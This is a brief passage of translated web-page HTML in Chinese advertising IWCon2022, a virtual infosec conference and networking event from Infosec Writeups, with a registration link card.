Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和充满力量的讨论会议。 <a class="ae lu" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank"> <strong class="ky ir">查看更多详情并在此注册。</strong> </a></p><div class="oh oi gp gr oj ok"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="ol ab fo"><div class="om ab on cl cj oo"><h2 class="bd ir gy z fp op fr fs oq fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="or l"><h3 class="bd b gy z fp op fr fs oq fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="os l"><p class="bd b dl z fp op fr fs oq fu fw dk translated">iwcon.live</p></div></div><div class="ot l"><div class="ou l ov ow ox ot oy jw ok"/></div></div></a></div></div></div>    
</body>
</html>